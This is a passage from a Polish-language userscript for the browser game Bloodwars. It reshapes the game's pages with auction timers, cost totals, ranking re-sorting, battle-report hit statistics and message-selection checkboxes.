            opis.innerHTML = '<center><a id="UM_OP_ukryj" href="javascript:">(kliknij aby ukryć opis)</a></center>' + opis.innerHTML;
            document.getElementById('UM_OP_ukryj').addEventListener('click', function () {
              GM_setValue(id + 'UM_OP_ukryj', true);
              location.reload();
            }, false);
          }
        }
        if (GM_getValue(id + 'UM_OP_ukryj2', true)) {
          opis = document.getElementsByClassName('clan-desc');
          if (opis.length) {
            opis = opis[1];
            opis.innerHTML = '<center><a id="UM_OP_ukryj2" href="javascript:">UKRYWANIE OPISU PRYWATNEGO AKTYWNE, KLIKNIJ BY WYŁĄCZYĆ TĄ OPCJE!</a></center>';
            document.getElementById('UM_OP_ukryj2').addEventListener('click', function () {
              GM_setValue(id + 'UM_OP_ukryj2', false);
              location.reload();
            }, false);
          }
        } else {
          opis = document.getElementsByClassName('clan-desc');
          if (opis.length) {
            opis = opis[1];
            opis.innerHTML = '<center><a id="UM_OP_ukryj2" href="javascript:">(kliknij aby ukryć opis)</a></center>' + opis.innerHTML;
            document.getElementById('UM_OP_ukryj2').addEventListener('click', function () {
              GM_setValue(id + 'UM_OP_ukryj2', true);
              location.reload();
            }, false);
          }
        }
      }
      if (a == '?a=training&do=evo') {
        // mod zliczanie kosztu ewolucji
        suma = 0;
        koszty = [
          ['Skrzydła',
          150,
          300 + 150,
          450 + 300 + 150,
          600 + 300 + 450 + 150],
          [
            'Pancerz',
            150,
            300 + 150,
            450 + 300 + 150,
            600 + 450 + 300 + 150
          ],
          [
            'Kły//Pazury//Kolce',
            150,
            300 + 150,
            450 + 300 + 150,
            600 + 300 + 450 + 150
          ],
          [
            'Gruczoły jadowe',
            150,
            300 + 150,
            450 + 300 + 150,
            600 + 450 + 300 + 150
          ],
          [
            'Wzmocnione ścięgna',
            150,
            300 + 150,
            450 + 300 + 150,
            600 + 450 + 300 + 150
          ],
          [
            'Dodatkowa komora',
            150,
            300 + 150,
            450 + 300 + 150,
            600 + 450 + 300 + 150
          ],
          [
            'Krew demona',
            150,
            300 + 150,
            450 + 300 + 150,
            600 + 450 + 300 + 150
          ],
          [
            'Mutacje DNA',
            150,
            300 + 150,
            450 + 300 + 150,
            600 + 300 + 450 + 150
          ],
          [
            'Oświecony',
            150,
            300 + 150,
            450 + 300 + 150,
            600 + 450 + 300 + 150
          ],
          [
            'Szósty zmysł',
            150,
            300 + 150,
            450 + 300 + 150,
            600 + 450 + 300 + 150
          ],
          [
            'Absorpcja',
            150,
            300 + 150,
            450 + 300 + 150,
            600 + 450 + 300 + 150
          ],
          [
            'Harmonijny rozwój',
            150,
            300 + 150,
            450 + 300 + 150,
            600 + 450 + 300 + 150
          ],
          [
            'Skażenie Maną',
            250,
            1000 + 250,
            2000 + 1000 + 250,
            4000 + 2000 + 100 + 250
          ],
          [
            'Pamięć przodków',
            300,
            600 + 300,
            900 + 600 + 300,
            1200 + 900 + 600 + 300
          ],
          [
            'Potęga',
            300,
            750 + 300,
            2000 + 750 + 300,
            5000 + 2000 + 750 + 300
          ],
          [
            'Lekkość bytu',
            150,
            450,
            900,
            1500
          ],
          [
            'Piromancja',
            250,
            1250,
            3250,
            7250
          ],
          [
            'Więź z Gają',
            250,
            1250,
            3250,
            7250
          ],
          [
            'Hydromancja',
            250,
            1250,
            3250,
            7250
          ],
          [
            'Forma astralna',
            250,
            1250,
            3250,
            7250
          ],
          [
            'Piętno demona',
            250,
            1250,
            3250,
            7250
          ]
        ];
        ewo = document.getElementsByClassName('training-evo-title');
        for (var i = 0; i < ewo.length; i++) {
          czs = ewo[i].innerHTML;
          for (var i2 = 0; i2 < koszty.length; i2++) {
            if (czs.search(koszty[i2][0]) > - 1) {
              if (czs.search('poziom ') > - 1) {
                lvl = parseInt(czs.substr(czs.search('poziom ') + 7, 1));
                suma += koszty[i2][lvl];
              }
            }
          }
        }
        t = 0;
        suma2 = '';
        suma = suma + '';
        for (i = suma.length - 1; i >= 0; i--) {
          suma2 = suma[i] + suma2;
          t++;
          if (t == 3) {
            t = 0;
            suma2 = ' ' + suma2;
          }
        }
        version = document.getElementById('content-mid');
        ver2 = document.createElement('SPAN');
        ver2.innerHTML = '<br><center>W SUMIE W TRENINGU: &nbsp;&nbsp;&nbsp;<b>' + suma2 + '</b></center>';
        version.appendChild(ver2, version.firstChild);
        div = document.getElementById('training_evo').getElementsByTagName('DIV');
        for (x in div) {
          test = div[x].getElementsByClassName('training-evo-frame');
          if (test.length > 0) {
            test = div[x].getElementsByClassName('error');
            if (test.length > 1) {
              div[x].style.opacity = '0.7';
            } else if (test.length > 0) {
              div[x].style.opacity = '0.25';
            }
          }
        }
      }
      function aukcjeLicz(xi) {
        roznica -= 1000;
        if (roznica <= 0) {
          roznica = 0;
          GM_setValue(id + 'UM_arok', - 1);
          GM_setValue(id + 'UM_amiesiac', 0);
          GM_setValue(id + 'UM_adzien', 0);
          GM_setValue(id + 'UM_agodzina', 0);
          GM_setValue(id + 'UM_aminuty', 0);
          GM_setValue(id + 'UM_asekundy', 0);
        } else {
          time = roznica;
          var days = Math.floor(time / 86400000);
          var hours = Math.floor((time - (86400000 * days)) / 3600000);
          if (hours < 10) hours = '0' + hours;
          var minutes = Math.floor((time - (86400000 * days) - (3600000 * hours)) / 60000);
          if (minutes < 10) minutes = '0' + minutes;
          var seconds = (time - (86400000 * days) - (3600000 * hours) - (60000 * minutes)) / 1000;
          seconds = Math.floor(seconds);
          if (seconds < 10) seconds = '0' + seconds;
          document.getElementById('aukcjaLicznik' + xi).innerHTML = hours + ':' + minutes + ':' + seconds;
          document.title = id.replace('r', 'R') + ' - ' + hours + ':' + minutes + ':' + seconds;
        }
      }
      if (a == '?a=auction' || a.substring(0, 21) == '?a=auction&do=watched') {
        test = document.getElementsByClassName('tblheader') [document.getElementsByClassName('tblheader').length - 1];
        test.getElementsByTagName('td') [4].style.width = '';
        aukcja = false;
        test = document.getElementsByTagName('TR');
        GM_setValue(id + 'UM_arok', - 1);
        GM_setValue(id + 'UM_amiesiac', 0);
        GM_setValue(id + 'UM_adzien', 0);
        GM_setValue(id + 'UM_agodzina', 0);
        GM_setValue(id + 'UM_aminuty', 0);
        GM_setValue(id + 'UM_asekundy', 0);
        for (xi in test) {
          if (xi == test.length - 1) {
            break;
          }
          if (test[xi].hasAttribute('id') == true) {
            if (test[xi].id.substr(0, 3) == 'au_') {
              tst = test[xi].getElementsByTagName('TD');
              if (tst[4].className == 'error') continue;
              czas = tst[4].innerHTML.replace('<br>', ' ');
              var rok = czas.split('-') [0].replace(/ /g, '');
              var miesiac = czas.split('-') [1];
              var dzien = czas.split('-') [2].split(' ') [0];
              var godzina = czas.split(':') [0].substring(czas.split(':') [0].length - 2, czas.split(':') [0].length);
              var minuty = czas.split(':') [1];
              var sekundy = czas.split(':') [2].substring(0, 2);
              pozniej = new Date(rok, miesiac - 1, dzien, godzina, minuty, sekundy);
              tst[4].innerHTML = tst[4].innerHTML.replace('<br>', ' ') + '<br>' + '<span id="aukcjaLicznik' + xi + '">&nbsp;</span>';
              var teraz = new Date();
              teraz.setTime(unsafeWindow.serverTime * 1000); //teraz.getTime()+unsafeWindow.timeDiff*1000);
              var roznica = pozniej.getTime() - teraz.getTime();
              GM_setValue(id + 'UM_arok', rok);
              GM_setValue(id + 'UM_amiesiac', miesiac);
              GM_setValue(id + 'UM_adzien', dzien);
              GM_setValue(id + 'UM_agodzina', godzina);
              GM_setValue(id + 'UM_aminuty', minuty);
              GM_setValue(id + 'UM_asekundy', sekundy);
              var i = setInterval(function () {
                aukcjeLicz(xi);
              }, 1000);
              break;
            }
          }
        }
      }
      if (a.substring(0, 22) == '?a=auction&do=itemlist' || a.substring(0, 8) == '?a=equip' || document.getElementsByClassName('msg-quest').length) {
        itemS = document.getElementsByClassName('item-link');
        for (i = 0; i < itemS.length; i++) {
          if (GM_getValue(id + 'UM_OP_legendarne', true)) {
            itemS[i].innerHTML = itemS[i].innerHTML.replace('Legendarny', '<span style="text-shadow: 2px 2px 2px black;color: ' + GM_getValue(id + 'UM_kolorlegenda', 'green') + '";>Legendarny');
            itemS[i].innerHTML = itemS[i].innerHTML.replace('Legendarna', '<span style="text-shadow: 2px 2px 2px black;color: ' + GM_getValue(id + 'UM_kolorlegenda', 'green') + '";>Legendarna');
            itemS[i].innerHTML = itemS[i].innerHTML.replace('Legendarne', '<span style="text-shadow: 2px 2px 2px black;color: ' + GM_getValue(id + 'UM_kolorlegenda', 'green') + '";>Legendarne');
          }
          if (GM_getValue(id + 'UM_OP_epickie', true)) {
            itemS[i].innerHTML = itemS[i].innerHTML.replace('Epickie', '<span style="text-shadow: 2px 2px 2px black;color: ' + GM_getValue(id + 'UM_kolorepik', 'blue') + '";>Epickie');
            itemS[i].innerHTML = itemS[i].innerHTML.replace('Epicki', '<span style="text-shadow: 2px 2px 2px black;color: ' + GM_getValue(id + 'UM_kolorepik', 'blue') + '";>Epicki');
            itemS[i].innerHTML = itemS[i].innerHTML.replace('Epicka', '<span style="text-shadow: 2px 2px 2px black;color: ' + GM_getValue(id + 'UM_kolorepik', 'blue') + '";>Epicka');
          }
        }
      }
      if ((a.substring(0, 7) == '?a=rank' && GM_getValue(id + 'UM_OP_mysort3', false)) || (a == '?a=rank' && GM_getValue(id + 'UM_OP_mysort', true)) || (a == '?a=rank&page=1' && GM_getValue(id + 'UM_OP_mysort1', true)) || (a == '?a=rank&page=2' && GM_getValue(id + 'UM_OP_mysort2', true))) {
        // mod sort rank
        table = document.getElementsByClassName('rank') [0];
        poz = table.getElementsByTagName('tr');
        nowe = new Array();
        for (x = 1; x < poz.length; x++) {
          nowe[x - 1] = new Array(10);
          td = poz[x].getElementsByTagName('td');
          yes = td[4].getElementsByTagName('img') [0].alt;
          if (yes < 0 || yes > 8) yes = 9;
          nowe[x - 1][0] = yes;
          nowe[x - 1][9] = td[0].innerHTML;
          nowe[x - 1][1] = td[0].innerHTML;
          if (nowe[x - 1][1].length < 3) nowe[x - 1][1] = '0' + nowe[x - 1][1]
          if (nowe[x - 1][1].length < 4) nowe[x - 1][1] = '0' + nowe[x - 1][1]
          nowe[x - 1][2] = td[1].innerHTML;
          nowe[x - 1][3] = td[2].innerHTML;
          if (td[3].innerHTML == 'M') nowe[x - 1][4] = '<span style="color: #006BAD;">' + td[3].innerHTML + '</span>';
           else nowe[x - 1][4] = '<span style="color: #AD00A5;">' + td[3].innerHTML + '</span>';
          nowe[x - 1][5] = td[4].innerHTML;
          nowe[x - 1][6] = td[5].innerHTML;
          nowe[x - 1][7] = td[6].innerHTML;
          nowe[x - 1][8] = td[7].innerHTML;
        }
        nowe.sort();
        table.innerHTML = '<tr class="tblheader"><td width="60">MIEJSCE</td><td width="160">NICK</td><td width="120">RASA</td><td width="50">SEX</td><td><img src="http://r12.bloodwars.interia.pl/gfx/msg3.gif" alt="NAPADNIJ"></td><td width="80">ADRES</td><td width="90">KLAN</td><td width="70">PUNKTY</td></tr>';
        for (x = 0; x < nowe.length; x++) {
          if (x % 2 == 0) even = 'even';
           else even = '';
          uid = nowe[x][2].substring(nowe[x][2].search('uid=') + 4, nowe[x][2].search('">'));
          teraz = new Date();
          teraz.setTime(unsafeWindow.serverTime * 1000); //teraz.getTime()+unsafeWindow.timeDiff*1000);
          teraz = teraz.getDate() + '/' + (teraz.getMonth() + 1) + '/' + teraz.getFullYear();
          testa = GM_getValue(id + 'UM_1_' + uid, 'A:B').split(':') [1];
          testb = GM_getValue(id + 'UM_2_' + uid, 'A:B').split(':') [1];
          atakowany = '';
          if (testa == testb && testb == teraz) atakowany = 'style="filter: alpha(opacity=10); opacity: .1;"';
           else if (testa == teraz || testb == teraz && testa != testb) atakowany = 'style="filter: alpha(opacity=65); opacity: .65;"';
          table.innerHTML += '<tr class="' + even + '" onmouseover="this.className=\'selectedItem\';" onmouseout="this.className=\'' + even + '\';" align="center"><td class="townview" style="text-align: center;">' + nowe[x][9] + '</td><td>' + nowe[x][2] + '</td><td>' + nowe[x][3] + '</td><td>' + nowe[x][4] + '</td><td ' + atakowany + '>' + nowe[x][5] + '</td><td>' + nowe[x][6] + '</td><td>' + nowe[x][7] + '</td><td>' + nowe[x][8] + '</td></tr>';
        }
      }
      if (a.substring(0, 7) == '?a=rank') {
        window.addEventListener('keydown', function (e) {
          var KeyID = (window.event) ? event.keyCode : e.keyCode;
          if (a.search('page=') > 0) {
            page = a.substring(a.search('page=') + 5, a.length);
            page = parseInt(page);
            if (page == 0) page = 1;
          } else page = 1;
          if (e.altKey) switch (KeyID) {
            case 37:
              if (page > 1) page--;
              window.location = '?a=rank&page=' + page;
              break;
            case 39:
              page++;
              window.location = '?a=rank&page=' + page;
              break;
          }
        },
        true);
      }
      function zaznaczacz(txt, check) {
        tr = document.getElementsByTagName('TR');
        for (i = 0; i < tr.length; i++) {
          td = tr[i].getElementsByTagName('TD');
          if (td.length == 4) if (td[3].innerHTML.length == 19) if (td[1].innerHTML.search(txt) > 0) td[0].getElementsByTagName('input') [0].checked = check;
        }
      }
      function zaznaczacz_res(check) {
        tr = document.getElementsByTagName('TR');
        for (i = 0; i < tr.length; i++) {
          td = tr[i].getElementsByTagName('TD');
          if (td.length == 4) if (td[3].innerHTML.length == 19) if (td[1].innerHTML.search('zasadzkę') < 1 && td[1].innerHTML.search('Arena - ') < 1 && td[1].innerHTML.search(' ofertę handlową') < 1 && td[1].innerHTML.search('Wygrana licytacja!') < 1 && td[1].innerHTML.search('Twoja aukcja została') < 1 && td[1].innerHTML.search('Twoja oferta została') < 1 && td[1].innerHTML.search('Raport z wyprawy.') < 1 && td[1].innerHTML.search('Raport z ekspedycji - ') < 1 && td[1].innerHTML.search('Król Wzgórza - ') < 1 && td[1].innerHTML.search('Oblężenie na ') < 1 && td[1].innerHTML.search('Walka na Arenie ') < 1) td[0].getElementsByTagName('input') [0].checked = check;
        }
      }
      if ('?a=msg' == a.substring(0, 6) || '?mid=' == a.substring(0, 5)) {
        rlc = document.getElementsByClassName('rlc');
        rlc2 = document.getElementsByClassName('rlc');
        if (rlc.length) {
          for (zmiana = 0; zmiana < rlc2.length; zmiana++) {
            var stan = new Array();
            var wyprowadzonych = new Array();
            var kolor = new Array();
            var unik = new Array();
            var kryty = new Array();
            var otrzymane = new Array();
            var uniknione = new Array();
            s = - 1;
            rlc = rlc2[zmiana];
            walka = rlc.getElementsByClassName('atkHit');
            for (i = 0; i < walka.length; i++) {
              kto = walka[i].getElementsByTagName('B') [0].innerHTML;
              if (s == - 1) {
                s = 0;
              } else {
                for (s = 0; s < stan.length; s++) {
                  if (stan[s] == kto) break;
                }
              }
              stan[s] = kto;
              if (walka[i].innerHTML.search('Żar Krwi') < 1) {
                if (wyprowadzonych[s] == undefined) wyprowadzonych[s] = 1;
                 else wyprowadzonych[s]++;
                if (unik[s] == undefined) unik[s] = 0;
                if (walka[i].innerHTML.search(' zostaje zranion') > 0) {
                  komu = walka[i].getElementsByTagName('b') [walka[i].getElementsByTagName('b').length - 2].innerHTML;
                  for (d = 0; d < stan.length; d++) {
                    if (stan[d] == komu) break;
                  }
                  stan[d] = komu;
                  kolor[d] = 'defHit';
                  if (wyprowadzonych[d] == undefined) wyprowadzonych[d] = 0;
                  if (kryty[d] == undefined) kryty[d] = 0;
                  if (unik[d] == undefined) unik[d] = 0;
                  if (otrzymane[d] == undefined) otrzymane[d] = 0;
                  otrzymane[d]++;
                } else
                if (walka[i].innerHTML.search(' trafi') > 0 && walka[i].innerHTML.search('luzję') == - 1) {
                  unik[s]++;
                  komu = walka[i].getElementsByTagName('b') [walka[i].getElementsByTagName('b').length - 1].innerHTML;
                  for (d = 0; d < stan.length; d++) {
                    if (stan[d] == komu) break;
                  }
                  stan[d] = komu;
                  kolor[d] = 'defHit';
                  if (wyprowadzonych[d] == undefined) wyprowadzonych[d] = 0;
                  if (kryty[d] == undefined) kryty[d] = 0;
                  if (unik[d] == undefined) unik[d] = 0;
                  if (uniknione[d] == undefined) uniknione[d] = 0;
                  uniknione[d]++;
                }
                if (kryty[s] == undefined) kryty[s] = 0;
                if (walka[i].innerHTML.search('cios krytyczny') > 0) kryty[s]++;
              }
              kolor[s] = 'atkHit';
            }
            walka = rlc.getElementsByClassName('defHit');
            for (i = 0; i < walka.length; i++) {
              kto = walka[i].getElementsByTagName('B') [0].innerHTML;
              if (s == - 1) {
                s = 0;
              } else {
                for (s = 0; s < stan.length; s++) {
                  if (stan[s] == kto) break;
                }
              }
              stan[s] = kto;
              if (walka[i].innerHTML.search('Żar Krwi') < 1) {
                if (wyprowadzonych[s] == undefined) wyprowadzonych[s] = 1;
                 else wyprowadzonych[s]++;
                if (unik[s] == undefined) unik[s] = 0;
                if (walka[i].innerHTML.search(' zostaje zranion') > 0) {
                  komu = walka[i].getElementsByTagName('b') [walka[i].getElementsByTagName('b').length - 2].innerHTML;
                  for (d = 0; d < stan.length; d++) {
                    if (stan[d] == komu) break;
                  }
                  stan[d] = komu;
                  kolor[d] = 'atkHit';
                  if (wyprowadzonych[d] == undefined) wyprowadzonych[d] = 0;
                  if (kryty[d] == undefined) kryty[d] = 0;
                  if (unik[d] == undefined) unik[d] = 0;
                  if (otrzymane[d] == undefined) otrzymane[d] = 0;
                  otrzymane[d]++;
                } else
                if (walka[i].innerHTML.search(' trafi') > 0 && walka[i].innerHTML.search('luzję') == - 1) {
                  unik[s]++;
                  komu = walka[i].getElementsByTagName('b') [walka[i].getElementsByTagName('b').length - 1].innerHTML;
                  for (d = 0; d < stan.length; d++) {
                    if (stan[d] == komu) break;
                  }
                  stan[d] = komu;
                  kolor[d] = 'atkHit';
                  if (wyprowadzonych[d] == undefined) wyprowadzonych[d] = 0;
                  if (kryty[d] == undefined) kryty[d] = 0;
                  if (unik[d] == undefined) unik[d] = 0;
                  if (uniknione[d] == undefined) uniknione[d] = 0;
                  uniknione[d]++;
                }
                if (kryty[s] == undefined) kryty[s] = 0;
                if (walka[i].innerHTML.search('cios krytyczny') > 0) kryty[s]++;
              }
              kolor[s] = 'defHit';
            }
            sum = document.getElementsByClassName('ambsummary');
            if (!sum.length) {
              sum = document.getElementsByClassName('result') [document.getElementsByClassName('result').length - 1];
              raport = '<br><table border="0" style="border-collapse: collapse; background: black; text-align: center;" width="100%"><tr>';
            } else {
              raport = '<br><table border="0" style="border-collapse: collapse; text-align: center;" width="95%"><tr>';
              sum = sum[zmiana];
            }
            for (i = 0; i < stan.length; i++) {
              if (i % 3 == 0) raport += '</tr><tr>';
              niceOne = '';
              niceKryty = true;
              niceIlosc = true;
              for (x = 0; x < stan.length; x++) {
                if (x != i) {
                  if (kryty[x] > kryty[i]) niceKryty = false;
                  if (wyprowadzonych[x] > wyprowadzonych[i]) niceIlosc = false;
                }
              }
              if (niceKryty || niceIlosc) niceOne = 'border: 2px white dotted;';
              raport += '<td style="' + niceOne + ' padding: 6px; text-align: center;"><b class="' + kolor[i] + '">' + stan[i] + '</b><BR>';
              raport += 'Trafione: <b>' + (parseInt(wyprowadzonych[i]) - parseInt(unik[i])) + '</b> / <b>' + wyprowadzonych[i] + '</b> ';
              if ((wyprowadzonych[i] - unik[i]) / wyprowadzonych[i] * 100) raport += '(' + (((wyprowadzonych[i] - unik[i]) / wyprowadzonych[i] * 100).toFixed(2)) + '%)';
              raport += '<br>Krytycznych: <b>' + kryty[i] + '</b> ';
              if (kryty[i]) raport += '(' + (((kryty[i]) / (wyprowadzonych[i] - unik[i]) * 100).toFixed(2)) + '%)';
              if (uniknione[i] == undefined) uniknione[i] = 0;
              if (otrzymane[i] == undefined) otrzymane[i] = 0;
              raport += '<br>Otrzymane: <b>' + otrzymane[i] + '</b> / <b>' + (otrzymane[i] + uniknione[i]) + '</b>';
              if (otrzymane[i] / (otrzymane[i] + uniknione[i]) * 100) raport += ' (' + (otrzymane[i] / (otrzymane[i] + uniknione[i]) * 100).toFixed(2) + '%)';
              raport += '</td>';
            }
            sum.innerHTML += raport + '</tr></table>';
          }
        }
      }
      if ('?a=msg' == a.substring(0, 6) || '?mid=' == a.substring(0, 5)) {
        add = document.getElementsByClassName('top-options') [0];
        add2 = document.createElement('SPAN');
        add2.innerHTML = '<br><br><center>ZAZNACZ: <input type="checkbox" id="zaz_wyp"> WYPRAWY <input type="checkbox" id="zaz_ata"> ATAKI <input type="checkbox" id="zaz_exp"> EXPY-OBLEGI <input type="checkbox" id="zaz_han"> HANDEL <input type="checkbox" id="zaz_res"> POZOSTAŁE</center>';
        add.appendChild(add2);
        document.getElementById('zaz_han').addEventListener('click', function () {
          zaznaczacz(' ofertę handlową', this.checked);
          zaznaczacz('Wygrana licytacja!', this.checked);
          zaznaczacz('Twoja aukcja została', this.checked);
          zaznaczacz('Twoja oferta została', this.checked);
        }, false);
        document.getElementById('zaz_ata').addEventListener('click', function () {
          zaznaczacz('zasadzkę', this.checked);
        }, false);
        document.getElementById('zaz_res').addEventListener('click', function () {
          zaznaczacz_res(this.checked);
        }, false);
        document.getElementById('zaz_wyp').addEventListener('click', function () {
          zaznaczacz('Raport z wyprawy.', this.checked);
        }, false);
        document.getElementById('zaz_exp').addEventListener('click', function () {
          zaznaczacz('Raport z ekspedycji - ', this.checked);
          zaznaczacz('Arena - ', this.checked);
          zaznaczacz('Król Wzgórza - ', this.checked);
          zaznaczacz('Oblężenie na ', this.checked);
          zaznaczacz('Walka na Arenie ', this.checked);
        }, false);
      }
      if ('?a=rank' == a.substring(0, 7)) {
        stats = document.getElementsByClassName('stats-player') [0].innerHTML;
        stats = stats.replace(/&lt;/gi, '<');
        stats = stats.replace(/&gt;/gi, '>');
        pts = (stats.substring((stats.search('<strong>') + 8), stats.search('</strong>')).replace(/ /gi, '')) / 1000;
        lev = Math.floor(Math.log(0.0011 * (pts * 1000 + 999)) / Math.log(1.1));
        table = document.getElementsByClassName('rank') [0];
        poz = table.getElementsByTagName('tr');
        t_lev = Math.ceil(lev / 100 * 84.5);
        for (x = 1; x < poz.length; x++) {
          td = poz[x].getElementsByTagName('td');
          e_pts = td[7].innerHTML;
          e_lev = Math.floor(Math.log(0.0011 * (e_pts * 1000 + 999)) / Math.log(1.1));
          if (e_lev >= t_lev) td[1].getElementsByTagName('b') [0].innerHTML += ' <span style="color: gray; float: right;">E</span>';
          taga = td[1].getElementsByTagName('a') [0];
          taga.onmouseover = function () {
            document.getElementById('chmurka').style.display = '';
            document.getElementById('chmurka').style.left = parseInt(document.getElementById('x').innerHTML) + 'px';
            document.getElementById('chmurka').style.top = parseInt(document.getElementById('y').innerHTML) + 10 + 'px';
            document.getElementById('chmurka').innerHTML = 'NOTATKI: ' + this.innerHTML + '<br/><br/>' + GM_getValue(id + 'UM_notka' + this.id.substring(1), 'brak (dodaj w profilu gracza)').replace(/\n/g, '<br />');
          }
          taga.onmouseout = function () {
            document.getElementById('chmurka').style.display = 'none';
          }
        }
      }
      if (a.substring(0, 11) == '?a=auction&' && a.search('&t=69') > 0) {
        if (a.search('addfav=') > 0)
        table = document.getElementsByTagName('TABLE') [6];
         else
        table = document.getElementsByTagName('TABLE') [5];
        if (document.getElementsByTagName('TABLE') [3].innerHTML.search('Twoja oferta zo') > 0) {
          table = document.getElementsByTagName('TABLE') [6];
        }
        tr = table.getElementsByTagName('TR');
        for (i = 1; i < tr.length; i++) {
          td = tr[i].getElementsByTagName('TD');
          sztuk = td[1].innerHTML.substring(td[1].innerHTML.search(':') + 1).replace('</span>', '');
          oferta = td[3].innerHTML.replace(' ', '').replace(' ', '');
          bid = td[6].innerHTML.substring(td[6].innerHTML.search('showBidForm') + 12);
          bid = bid.substr(0, bid.search(';') - 1);
          if (td[2].innerHTML == '0')
          td[1].innerHTML += ' (' + unsafeWindow.auData[parseInt(bid)].minPrize + ' - ' + (Math.round(unsafeWindow.auData[parseInt(bid)].minPrize / sztuk)) + '/szt)';
           else
          td[1].innerHTML += ' (' + unsafeWindow.auData[parseInt(bid)].minPrize + ')';
          if (parseInt(oferta) > 0) {
            td[3].innerHTML += ' - ' + (Math.round(oferta / sztuk)) + '/szt';
            td[6].innerHTML = td[6].innerHTML.replace(/LICYTUJ/g, 'LICYTUJ <b>' + (Math.round(oferta / sztuk * 1.05)) + '</b>/szt');
          }
        }
      }
      if (a.substring(0, 11) == '?a=townview') {
        var scriptCode = new Array();
        scriptCode.push('function showSector(str, sec) {');
        scriptCode.push('\tif (str < 1) str = 1;');
        scriptCode.push('\tif (str > 5) str = 5;');
        scriptCode.push('\tvar maxSectors = getMaxSectors(str);');
        scriptCode.push('\tif (sec < 1) sec = maxSectors;');
        scriptCode.push('\tif (sec > maxSectors) sec = 1;');
        scriptCode.push('\tif (str == strefa && sec == sektor) return false;');
        scriptCode.push('\tstrefa = str;');
        scriptCode.push('\tsektor = sec;');
        //		scriptCode.push('	document.getElementById(\'please_wait\').style.visibility = \'visible\';');
        //	scriptCode.push('	for (x = 1; x <= 5; x++) document.getElementById(\'btn_\'+x).disabled = true;');
        //scriptCode.push('	getFile(\'_ajaxTownView.php?strefa=\'+strefa+\'&sektor=\'+sektor);');
        scriptCode.push('lockButtons();getSectorData(strefa, sektor);');
        scriptCode.push('\tsetTimeout(function () { stats = document.getElementsByClassName(\'stats-player\')[0].innerHTML;');
        scriptCode.push('\tstats = stats.replace(/&lt;/gi,"<");');
        scriptCode.push('\tstats = stats.replace(/&gt;/gi,">");');
        scriptCode.push('\tpts = (stats.substring((stats.search(\'<strong>\')+8),stats.search(\'</strong>\')).replace(/ /gi,"")) / 1000;');
        scriptCode.push('\tlev = Math.floor(Math.log(0.0011*(pts*1000+999))/Math.log(1.1));');
        scriptCode.push('\tt_lev = Math.ceil(lev / 100 * 84.5);');
        scriptCode.push('\ts = document.getElementsByClassName(\'panel-cell\')[0].innerHTML;');
        scriptCode.push('\taj = parseInt(s.split(\'/\')[0])+1;');
        scriptCode.push('\tns = ((parseInt((s.split(\'/\')[1]-1)*12))+parseInt(s.split(\'/\')[2]));');
        scriptCode.push('\ttr = document.getElementsByTagName(\'tr\');');
        scriptCode.push('\tfor (i=0; i<tr.length; i++) {');
        scriptCode.push('\t\tif (tr[i].style.height=="16px") {');
        scriptCode.push('\t\t\ttd = tr[i].getElementsByTagName(\'td\');');
        scriptCode.push('\t\t\tif (td[3].getElementsByTagName(\'b\').length) {');
        scriptCode.push('\t\t\t\te_pts = td[3].getElementsByTagName(\'b\')[0].innerHTML;');
        scriptCode.push('\t\t\t\te_lev = Math.floor(Math.log(0.0011*(e_pts*1000+999))/Math.log(1.1));');
        scriptCode.push('\t\t\t\tif (e_lev>=t_lev) td[1].innerHTML+=\' <span style="color: gray; float: right;">E</span>\';');
        scriptCode.push('\t\t\t\tif (s.split(\'/\')[0]!=5) if (td[8].innerHTML.length==27) td[8].innerHTML=\'<a href="?a=townview&amp;strefa=\'+aj+\'&amp;sektor=\'+ns+\'">\'+aj+\'/\'+ns+\'</a>\';');
        scriptCode.push('\t\t\t}');
        scriptCode.push('\t\t}');
        scriptCode.push('\t} },1000);');
        scriptCode.push('}');
        var script = document.createElement('script');
        script.innerHTML = scriptCode.join('\n');
        scriptCode.length = 0;
        document.getElementsByTagName('head') [0].appendChild(script);
        stats = document.getElementsByClassName('stats-player') [0].innerHTML;
        stats = stats.replace(/&lt;/gi, '<');
        stats = stats.replace(/&gt;/gi, '>');
        pts = (stats.substring((stats.search('<strong>') + 8), stats.search('</strong>')).replace(/ /gi, '')) / 1000;
        lev = Math.floor(Math.log(0.0011 * (pts * 1000 + 999)) / Math.log(1.1));
        t_lev = Math.ceil(lev / 100 * 84.5);
        s = document.getElementsByClassName('panel-cell') [0].innerHTML;
        aj = parseInt(s.split('/') [0]) + 1;
        ns = ((parseInt((s.split('/') [1] - 1) * 12)) + parseInt(s.split('/') [2]));
        tr = document.getElementsByTagName('tr');
        for (i = 0; i < tr.length; i++) {
          if (tr[i].style.height == '16px') {
            td = tr[i].getElementsByTagName('td');
            if (td[3].getElementsByTagName('b').length) {
              e_pts = td[3].getElementsByTagName('b') [0].innerHTML;
              e_lev = Math.floor(Math.log(0.0011 * (e_pts * 1000 + 999)) / Math.log(1.1));
              if (e_lev >= t_lev) td[1].innerHTML += ' <span style="color: gray; float: right;">E</span>';
              if (s.split('/') [0] != 5) {
                if (td[8].innerHTML.length < 59) td[8].innerHTML = '<a href="?a=townview&amp;strefa=' + aj + '&amp;sektor=' + ns + '">' + aj + '/' + ns + '</a>';
              }
              taga = td[1].getElementsByTagName('a');
              if (taga.length) {
                taga = taga[0];
                taga.onmouseover = function () {
                  document.getElementById('chmurka').style.display = '';
                  document.getElementById('chmurka').style.left = parseInt(document.getElementById('x').innerHTML) + 'px';
                  document.getElementById('chmurka').style.top = parseInt(document.getElementById('y').innerHTML) + 10 + 'px';
                  document.getElementById('chmurka').innerHTML = 'NOTATKI: ' + this.innerHTML + '<br/><br/>' + GM_getValue(id + 'UM_notka' + this.id.substring(1), 'brak (dodaj w profilu gracza)');
                }
                taga.onmouseout = function () {
                  document.getElementById('chmurka').style.display = 'none';
                }
              }
            }
          }
        }
      }
      if ('?a=build' == a.substring(0, 8)) {
        bld = document.getElementsByClassName('bldprogress');
        if (bld.length) {
          GM_setValue(id + 'UM_bld', true);
          script = bld[0].getElementsByTagName('SCRIPT') [0];
          //			bldtime = script.innerHTML.substring(script.innerHTML.search('timeFields.bld_action = ')+24,script.innerHTML.search(';'));
          var bldtime = 0;
          var p = document.getElementById('bld_action').innerText.split(':');
          b = 0;
          if (p[0].length > 5) {
            b = 24 * 60 * 60 * p[0].split(' ') [0];
            p[0] = p[0].split(' ') [2];
          }
          bldtime = parseInt(p[2]) + parseInt(p[1] * 60) + parseInt(p[0] * 60 * 60) + b;
          var pozniej = new Date();
          pozniej.setTime(unsafeWindow.serverTime * 1000); //pozniej.getTime()+unsafeWindow.timeDiff*1000);
